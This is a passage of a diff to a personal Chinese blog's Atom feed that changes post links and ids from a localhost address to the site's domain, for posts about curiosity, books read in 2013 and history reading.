    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.meimeidu.com/Upload/%E5%87%A1%E4%BA%BA%E5%A4%A7%E6%99%BA%E6%85%A7/201107201632325593.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;我们在学生时期，被老师和家长不停的灌输着学习好就能获得优质生活的思想（说直白点，就是有钱，有房，有美女），而放弃了思考，投身于人民海洋一样的高考。可是，当我们拿到了不错的考试分数时，我们非但没有欣喜，反而更加迷茫了，我要学什么？这时强势一点的家长，就会像那些看今年什么卖得好就种什么的农民一样，帮我们选择最热门的专业。&lt;/p&gt;
@@ -1136,9 +1136,9 @@ if(!isset($paytype))
  
  <entry>
    <title>别丢弃你的求知欲</title>
-   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/16/%E5%88%AB%E4%B8%A2%E5%BC%83%E4%BD%A0%E7%9A%84%E6%B1%82%E7%9F%A5%E6%AC%B2.html"/>
+   <link href="www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/16/%E5%88%AB%E4%B8%A2%E5%BC%83%E4%BD%A0%E7%9A%84%E6%B1%82%E7%9F%A5%E6%AC%B2.html"/>
    <updated>2014-02-16T21:20:36+08:00</updated>
-   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/16/别丢弃你的求知欲</id>
+   <id>www.tang3.org/%E9%9A%8F%E6%83%B3/2014/02/16/别丢弃你的求知欲</id>
    <content type="html">&lt;p&gt;&lt;strong&gt;你是不是觉得现在的生活离开了手机和网游就变的很无聊？如果是，那么这篇文章也许会帮你找到解决办法。&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/3f18819bgw1edllx2on3oj20p00gkwfa.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
@@ -1176,9 +1176,9 @@ if(!isset($paytype))
  
  <entry>
    <title>盘点2013年读过的书</title>
-   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/02/02/%E7%9B%98%E7%82%B92013%E5%B9%B4%E8%AF%BB%E8%BF%87%E7%9A%84%E4%B9%A6.html"/>
+   <link href="www.tang3.org/%E8%AF%BB%E4%B9%A6/2014/02/02/%E7%9B%98%E7%82%B92013%E5%B9%B4%E8%AF%BB%E8%BF%87%E7%9A%84%E4%B9%A6.html"/>
    <updated>2014-02-02T20:46:19+08:00</updated>
-   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/02/02/盘点2013年读过的书</id>
+   <id>www.tang3.org/%E8%AF%BB%E4%B9%A6/2014/02/02/盘点2013年读过的书</id>
    <content type="html">&lt;p&gt;终于有时间坐下来盘点下自己2013年读过的书了，本来想年前搞定的，可是。。。爱情公寓、三体、博客、聚会。。。总之各种拖延。不过，好在今天终于能咬牙坐下来写了。&lt;/p&gt;
 
 &lt;p&gt;废话也不多说了，先看看去年（蛇年）我都读完了什么书吧。《&lt;a href=&quot;http://www.amazon.cn/%E6%8E%98%E9%87%91%E9%BB%91%E5%AE%A2-%E9%A9%AC%E5%85%8B%E6%96%AF%E2%80%A2%E7%BB%B4%E4%BA%AC-%E5%9C%B0%E4%B8%8B%E7%BD%91&quot;&gt;掘金黑客&lt;/a&gt;》《&lt;a href=&quot;http://www.amazon.cn/%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF-%E5%8F%B2%E8%92%82%E8%8A%AC%E2%80%A2%E6%9F%AF%E7%BB%B4/dp/B00B4NTCT2/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391350889&amp;amp;sr=8-1&amp;amp;keywords=%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF&quot;&gt;高效能人士的七个习惯&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E8%AE%BA%E4%B8%AD%E5%9B%BD-%E4%BA%A8%E5%88%A9%E2%80%A2%E5%9F%BA%E8%BE%9B%E6%A0%BC/dp/B009AL1FPE/ref=sr_1_1?ie=UTF8&amp;amp;qid=1390628477&amp;amp;sr=8-1&amp;amp;keywords=%E8%AE%BA%E4%B8%AD%E5%9B%BD&quot;&gt;论中国&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E9%98%BF%E7%B1%B3%E5%A5%97%E8%A3%85-%E7%B3%BB%E5%88%972008%E5%B9%B4%E7%99%BB%E5%85%A5%E4%B8%AD%E5%9B%BD-%E7%AB%8B%E5%88%BB%E5%90%B8%E5%BC%95%E4%BA%86%E6%97%A0%E6%95%B0%E5%B0%91%E5%B9%B4%E5%84%BF%E7%AB%A5%E7%9A%84%E7%9B%AE%E5%85%89-%E8%87%B3%E4%BB%8A%E5%B7%B2%E7%83%AD%E9%94%80500%E4%B8%87%E5%86%8C-%E5%9C%A8%E5%85%A8%E7%90%83%E8%A2%AB%E8%AF%91%E6%88%90%E5%8D%81%E4%BA%8C%E7%A7%8D%E8%AF%AD%E8%A8%80-%E4%B8%96%E7%95%8C%E5%90%84%E5%9C%B0%E9%83%BD%E6%9C%89%E5%AE%83%E5%BF%A0%E5%AE%9E%E7%9A%84%E8%AF%BB%E8%80%85-%E5%A7%94%E5%86%85%E7%91%9E%E6%8B%89-%E6%81%A9%E9%87%8C%E5%85%8B%C2%B7%E5%B7%B4%E9%87%8C%E5%A5%A5%E6%96%AF/dp/B009QI16N2/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351519&amp;amp;sr=8-1&amp;amp;keywords=%E9%98%BF%E7%B1%B3&quot;&gt;阿米&lt;/a&gt;》三部曲、《&lt;a href=&quot;http://www.amazon.cn/gp/product/B006DVQKCC/ref=cm_cr_ryp_prd_ttl_sol_6&quot;&gt;浩荡两千年&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E6%B5%AA%E6%BD%AE%E4%B9%8B%E5%B7%85-%E5%90%B4%E5%86%9B/dp/B00D73BJWK/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351582&amp;amp;sr=8-1&amp;amp;keywords=%E6%B5%AA%E6%BD%AE%E4%B9%8B%E5%B7%85+%E7%AC%AC%E4%BA%8C%E7%89%88&quot;&gt;浪潮之巅&lt;/a&gt;》第二版、《&lt;a href=&quot;http://www.amazon.cn/gp/product/B00D406VWO/ref=cm_cr_ryp_prd_ttl_sol_4&quot;&gt;中国国民性演变历程&lt;/a&gt;》。还有几本没看完，陪我跨年了的，《&lt;a href=&quot;http://www.amazon.cn/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%AD%E7%9A%84%E4%BA%BA%E6%80%A7%E6%BC%8F%E6%B4%9E-%E6%B5%B7%E5%BE%B7%E7%BA%B3%E5%90%89/dp/B00GWP2GG8/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351654&amp;amp;sr=8-1&amp;amp;keywords=%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6&quot;&gt;社会工程:安全体系中的人性漏洞&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/s/ref=nb_sb_noss_1?__mk_zh_CN=%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%BD%91%E7%AB%99&amp;amp;url=search-alias%3Daps&amp;amp;field-keywords=%E4%B8%89%E4%BD%93&amp;amp;rh=i%3Aaps%2Ck%3A%E4%B8%89%E4%BD%93&quot;&gt;三体&lt;/a&gt;》三部曲。&lt;/p&gt;
@@ -1281,9 +1281,9 @@ if(!isset($paytype))
  
  <entry>
    <title>2013年我读过的历史书</title>
-   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/01/28/2013%E5%B9%B4%E6%88%91%E8%AF%BB%E8%BF%87%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6.html"/>
+   <link href="www.tang3.org/%E8%AF%BB%E4%B9%A6/2014/01/28/2013%E5%B9%B4%E6%88%91%E8%AF%BB%E8%BF%87%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6.html"/>
    <updated>2014-01-28T02:04:34+08:00</updated>
-   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/01/28/2013年我读过的历史书</id>
+   <id>www.tang3.org/%E8%AF%BB%E4%B9%A6/2014/01/28/2013年我读过的历史书</id>
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/3f18819bjw1ecvv4h3kpzj20sg0nsq9a.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;读完《&lt;a href=&quot;http://www.amazon.cn/gp/product/B00D406VWO/ref=cm_cr_ryp_prd_ttl_sol_4&quot;&gt;中国国民性演变历程&lt;/a&gt;》这本书很久了，早就想写篇读后感，不过春节放假前各种事情和聚会，一直拖到现在终于有时间了。&lt;/em&gt;&lt;/p&gt;
